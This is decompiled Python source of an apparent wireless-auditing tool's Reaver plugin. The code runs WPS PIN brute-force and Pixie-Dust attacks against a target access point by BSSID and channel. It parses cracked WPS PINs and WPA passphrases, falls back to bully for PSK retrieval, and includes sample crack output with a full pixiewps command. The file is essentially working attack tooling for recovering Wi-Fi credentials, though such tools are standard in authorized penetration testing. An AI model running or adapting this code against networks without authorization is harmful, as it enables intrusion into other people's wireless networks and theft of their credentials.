# uncompyle6 version 3.7.4
# Python bytecode 3.6 (3379)
# Decompiled from: Python 3.6.9 (default, Apr 18 2020, 01:56:04) 
# [GCC 8.4.0]
# Embedded file name: build/bdist.linux-x86_64/egg/src/plugins/reaver.py
# Compiled at: 2020-01-20 05:56:15
# Size of source mod 2**32: 16567 bytes
from .dependency import Dependency
from .airodump import Airodump
from ..handlers.attack import Attack
from ..config import Configuration
from ..handlers.result import CrackResultWPS
from ..handlers.color import Color
from ..handlers.process import Process
from ..handlers.timer import Timer
import os, time, re

class Reaver(Attack, Dependency):
    dependency_required = False
    dependency_name = 'reaver'
    dependency_url = 'https://github.com/t6x/reaver-wps-fork-t6x'

    def __init__(self, target, pixie_dust=True):
        super(Reaver, self).__init__(target)
        self.pixie_dust = pixie_dust
        self.progress = '0.00%'
        self.state = 'Initializing'
        self.locked = False
        self.total_attempts = 0
        self.total_timeouts = 0
        self.total_wpsfails = 0
        self.last_pins = set()
        self.last_line_number = 0
        self.crack_result = None
        self.output_filename = Configuration.temp('reaver.out')
        if os.path.exists(self.output_filename):
            os.remove(self.output_filename)
        self.output_write = open(self.output_filename, 'a')
        self.reaver_cmd = [
         'reaver',
         '--interface', Configuration.interface,
         '--bssid', self.target.bssid,
         '--channel', self.target.channel,
         '-vv']
        if pixie_dust:
            self.reaver_cmd.extend(['--pixie-dust', '1'])
        self.reaver_proc = None

    @staticmethod
    def is_pixiedust_supported():
        """ Checks if 'reaver' supports WPS Pixie-Dust attack """
        output = Process(['reaver', '-h']).stderr()
        return '--pixie-dust' in output

    def run(self):
        """ Returns True if attack is successful. """
        try:
            self._run()
        except Exception as e:
            self.pattack(('{R}Failed:{O} %s' % str(e)), newline=True)
            return self.crack_result is not None

        if self.reaver_proc.poll() is None:
            self.reaver_proc.interrupt()
        if self.output_write:
            self.output_write.close()
        return self.crack_result is not None

    def _run(self):
        self.start_time = time.time()
        with Airodump(channel=(self.target.channel), target_bssid=(self.target.bssid),
          skip_wps=True,
          output_file_prefix='pixie') as (airodump):
            self.pattack('Waiting for target to appear...')
            self.target = self.wait_for_target(airodump)
            self.reaver_proc = Process((self.reaver_cmd), stdout=(self.output_write),
              stderr=(Process.devnull()))
            self.reaver_proc.stdin('y\n')
            while self.crack_result is None and self.reaver_proc.poll() is None:
                self.target = self.wait_for_target(airodump)
                stdout = self.get_output()
                self.state = self.parse_state(stdout)
                self.parse_failure(stdout)
                self.pattack(self.get_status())
                self.crack_result = self.parse_crack_result(stdout)
                if self.locked:
                    if not Configuration.wps_ignore_lock:
                        raise Exception('{O}Access point is {R}Locked{W}')
                time.sleep(0.5)

            stdout = self.get_output()
            self.crack_result = self.parse_crack_result(stdout)
            if self.crack_result is None:
                self.parse_failure(stdout)
            if self.crack_result is None:
                if self.reaver_proc.poll() is not None:
                    raise Exception('Reaver process stopped (exit code: %s)' % self.reaver_proc.poll())

    def get_status(self):
        if self.pixie_dust:
            main_status = ''
        else:
            main_status = '({G}%s{W}) ' % self.progress
        main_status += self.state
        meta_statuses = []
        if self.total_timeouts > 0:
            meta_statuses.append('{O}Timeouts:%d{W}' % self.total_timeouts)
        if self.total_wpsfails > 0:
            meta_statuses.append('{O}Fails:%d{W}' % self.total_wpsfails)
        if self.locked:
            meta_statuses.append('{R}Locked{W}')
        if len(meta_statuses) > 0:
            main_status += ' (%s)' % ', '.join(meta_statuses)
        return main_status

    def parse_crack_result(self, stdout):
        if self.crack_result is not None:
            return self.crack_result
        pin, psk, ssid = self.get_pin_psk_ssid(stdout)
        if pin is not None:
            if psk is not None:
                self.pattack(('{G}Cracked WPS PIN: {C}%s{W} {G}PSK: {C}%s{W}' % (pin, psk)), newline=True)
            else:
                self.pattack(('{G}Cracked WPS PIN: {C}%s' % pin), newline=True)
                self.pattack('{W}Retrieving PSK using {C}bully{W}...')
                psk = None
                try:
                    from .bully import Bully
                    psk = Bully.get_psk_from_pin(self.target, pin)
                except KeyboardInterrupt:
                    pass

                if psk is None:
                    Color.pl('')
                    self.pattack('{R}Failed {O}to get PSK using bully', newline=True)
                else:
                    self.pattack(('{G}Cracked WPS PSK: {C}%s' % psk), newline=True)
            crack_result = CrackResultWPS(self.target.bssid, ssid, pin, psk)
            crack_result.dump()
            return crack_result

    def parse_failure(self, stdout):
        if 'WPS pin not found' in stdout:
            raise Exception('Reaver says "WPS pin not found"')
        else:
            if self.pixie_dust:
                if self.running_time() > Configuration.wps_pixie_timeout:
                    raise Exception('Timeout after %d seconds' % Configuration.wps_pixie_timeout)
            self.total_wpsfails = stdout.count('WPS transaction failed')
            if self.total_wpsfails >= Configuration.wps_fail_threshold:
                raise Exception('Too many failures (%d)' % self.total_wpsfails)
            self.total_timeouts = stdout.count('Receive timeout occurred')
            if self.total_timeouts >= Configuration.wps_timeout_threshold:
                raise Exception('Too many timeouts (%d)' % self.total_timeouts)

    def parse_state(self, stdout):
        state = self.state
        stdout_last_line = stdout.split('\n')[(-1)]
        if 'Waiting for beacon from' in stdout_last_line:
            state = 'Waiting for beacon'
        else:
            if 'Associated with' in stdout_last_line:
                state = 'Associated'
            else:
                if 'Starting Cracking Session.' in stdout_last_line:
                    state = 'Started Cracking'
                else:
                    if 'Trying pin' in stdout_last_line:
                        state = 'Trying PIN'
                    else:
                        if 'Sending EAPOL START request' in stdout_last_line:
                            state = 'Sending EAPOL'
                        else:
                            if 'Sending identity response' in stdout_last_line:
                                state = 'Sending ID'
                                self.locked = False
                            else:
                                if 'Sending M' in stdout_last_line:
                                    for num in ('2', '4', '6'):
                                        if 'Sending M%s message' % num in stdout_last_line:
                                            state = 'Sending M%s' % num
                                            if num == '2':
                                                if self.pixie_dust:
                                                    state += ' / Running pixiewps'
                                            self.locked = False

                                else:
                                    if 'Received M' in stdout_last_line:
                                        for num in ('1', '3', '5', '7'):
                                            if 'Received M%s message' % num in stdout_last_line:
                                                state = 'Received M%s' % num
                                                self.locked = False

                                    else:
                                        if 'Detected AP rate limiting,' in stdout_last_line:
                                            state = 'Rate-Limited by AP'
                                            self.locked = True
        stdout_diff = stdout[self.last_line_number:]
        self.last_line_number = len(stdout)
        percentages = re.findall('([0-9.]+%) complete .* \\(([0-9.]+) seconds/pin\\)', stdout_diff)
        if len(percentages) > 0:
            self.progress = percentages[(-1)][0]
        new_pins = set(re.findall('Trying pin "([0-9]+)"', stdout_diff))
        if len(new_pins) > 0:
            self.total_attempts += len(new_pins.difference(self.last_pins))
            self.last_pins = new_pins
        return state

    def pattack(self, message, newline=False):
        if self.pixie_dust:
            time_left = Configuration.wps_pixie_timeout - self.running_time()
            time_msg = '{O}%s{W}' % Timer.secs_to_str(time_left)
            attack_name = 'Pixie-Dust'
        else:
            time_left = self.running_time()
            time_msg = '{C}%s{W}' % Timer.secs_to_str(time_left)
            attack_name = 'PIN Attack'
        if self.total_attempts > 0:
            if not self.pixie_dust:
                time_msg += ' {D}PINs:{W}{C}%d{W}' % self.total_attempts
        Color.clear_entire_line()
        Color.pattack('WPS', self.target, attack_name, '{W}[%s] %s' % (time_msg, message))
        if newline:
            Color.pl('')

    def running_time(self):
        return int(time.time() - self.start_time)

    @staticmethod
    def get_pin_psk_ssid(stdout):
        """ Parses WPS PIN, PSK, and SSID from output """
        pin = psk = ssid = None
        regex = re.search('WPS pin:\\s*([0-9]+)', stdout, re.IGNORECASE)
        if regex:
            pin = regex.group(1)
        if pin is None:
            regex = re.search("WPS PIN:\\s*'([0-9]+)'", stdout, re.IGNORECASE)
            if regex:
                pin = regex.group(1)
        regex = re.search("WPA PSK:\\s*'(.+)'", stdout)
        if regex:
            psk = regex.group(1)
        regex = re.search("AP SSID:\\s*'(.*)'", stdout)
        if regex:
            ssid = regex.group(1)
        if ssid is None:
            regex = re.search('Associated with [0-9A-F:]+ \\(ESSID: (.*)\\)', stdout)
            if regex:
                ssid = regex.group(1)
        return (
         pin, psk, ssid)

    def get_output(self):
        """ Gets output from reaver's output file """
        if not self.output_filename:
            return ''
        else:
            if self.output_write:
                self.output_write.flush()
            with open(self.output_filename, 'r') as (fid):
                stdout = fid.read()
            if Configuration.verbose > 1:
                Color.pe('\n{P} [reaver:stdout] %s' % '\n [reaver:stdout] '.join(stdout.split('\n')))
            return stdout.strip()


if __name__ == '__main__':
    old_stdout = "\n[Pixie-Dust]\n[Pixie-Dust]   Pixiewps 1.1\n[Pixie-Dust]\n[Pixie-Dust]   [*] E-S1:       00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n[Pixie-Dust]   [*] E-S2:       00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n[Pixie-Dust]   [+] WPS pin:    12345678\n[Pixie-Dust]\n[Pixie-Dust]   [*] Time taken: 0 s\n[Pixie-Dust]\nRunning reaver with the correct pin, wait ...\nCmd : reaver -i wlan0mon -b 08:86:3B:8C:FD:9C -c 11 -s y -vv -p 28097402\n\n[Reaver Test] BSSID: AA:BB:CC:DD:EE:FF\n[Reaver Test] Channel: 11\n[Reaver Test] [+] WPS PIN: '12345678'\n[Reaver Test] [+] WPA PSK: 'Test PSK'\n[Reaver Test] [+] AP SSID: 'Test Router'\n"
    new_stdout = '\n[+] Switching wlan1mon to channel 5\n[+] Waiting for beacon from EC:1A:59:37:70:0E\n[+] Received beacon from EC:1A:59:37:70:0E\n[+] Vendor: RealtekS\n[+] Trying pin "12345670"\n[+] Sending authentication request\n[+] Sending association request\n[+] Associated with EC:1A:59:37:70:0E (ESSID: belkin.00e)\n[+] Sending EAPOL START request\n[+] Received identity request\n[+] Sending identity response\n[+] Received M1 message\n[+] Sending M2 message\n\n Pixiewps 1.4\n\n [?] Mode:     3 (RTL819x)\n [*] Seed N1:  -\n [*] Seed ES1: -\n [*] Seed ES2: -\n [*] PSK1:     2c2e33f5e3a870759f0aeebbd2792450\n [*] PSK2:     3f4ca4ea81b2e8d233a4b80f9d09805d\n [*] ES1:      04d48dc20ec785762ce1a21a50bc46c2\n [*] ES2:      04d48dc20ec785762ce1a21a50bc46c2\n [+] WPS pin:  11867722\n\n [*] Time taken: 0 s 21 ms\n\nexecuting pixiewps -e d0141b15656e96b85fcead2e8e76330d2b1ac1576bb026e7a328c0e1baf8cf91664371174c08ee12ec92b0519c54879f21255be5a8770e1fa1880470ef423c90e34d7847a6fcb4924563d1af1db0c481ead9852c519bf1dd429c163951cf69181b132aea2a3684caf35bc54aca1b20c88bb3b7339ff7d56e09139d77f0ac58079097938251dbbe75e86715cc6b7c0ca945fa8dd8d661beb73b414032798dadee32b5dd61bf105f18d89217760b75c5d966a5a490472ceba9e3b4224f3d89fb2b -s 5a67001334e3e4cb236f4e134a4d3b48d625a648e991f978d9aca879469d5da5 -z c8a2ccc5fb6dc4f4d69b245091022dc7e998e42ec1d548d57c35a312ff63ef20 -a 60b59c0c587c6c44007f7081c3372489febbe810a97483f5cc5cd8463c3920de -n 04d48dc20ec785762ce1a21a50bc46c2 -r 7a191e22a7b519f40d3af21b93a21d4f837718b45063a8a69ac6d16c6e5203477c18036ca01e9e56d0322e70c2e1baa66518f1b46d01acc577d1dfa34efd2e9ee36e2b7e68819cddacceb596a8895243e33cb48c570458a539dcb523a4d4c4360e158c29b882f7f385821ea043705eb56538b45daa445157c84e60fc94ef48136eb4e9725b134902b96c90b1ae54cbd42b29b52611903fdae5aa88bfc320f173d2bbe31df4996ebdb51342c6b8bd4e82ae5aa80b2a09a8bf8faa9a8332dc9819\n'
    pin_attack_stdout = "\n[+] Pin cracked in 16 seconds\n[+] WPS PIN: '01030365'\n[+] WPA PSK: 'password'\n[+] AP SSID: 'AirLink89300'\n"
    pin, psk, ssid = Reaver.get_pin_psk_ssid(old_stdout)
    assert pin == '12345678', 'pin was "%s", should have been "12345678"' % pin
    assert psk == 'Test PSK', 'psk was "%s", should have been "Test PSK"' % psk
    assert ssid == 'Test Router', 'ssid was %s, should have been Test Router' % repr(ssid)
    result = CrackResultWPS('AA:BB:CC:DD:EE:FF', ssid, pin, psk)
    result.dump()
    print('')
    pin, psk, ssid = Reaver.get_pin_psk_ssid(new_stdout)
    assert pin == '11867722', 'pin was "%s", should have been "11867722"' % pin
    assert psk is None, 'psk was "%s", should have been "None"' % psk
    assert ssid == 'belkin.00e', 'ssid was "%s", should have been "belkin.00e"' % repr(ssid)
    result = CrackResultWPS('AA:BB:CC:DD:EE:FF', ssid, pin, psk)
    result.dump()
    print('')
    pin, psk, ssid = Reaver.get_pin_psk_ssid(pin_attack_stdout)
    assert pin == '01030365', 'pin was "%s", should have been "01030365"' % pin
    assert psk == 'password', 'psk was "%s", should have been "password"' % psk
    assert ssid == 'AirLink89300', 'ssid was "%s", should have been "AirLink89300"' % repr(ssid)
    result = CrackResultWPS('AA:BB:CC:DD:EE:FF', ssid, pin, psk)
    result.dump()
    print('')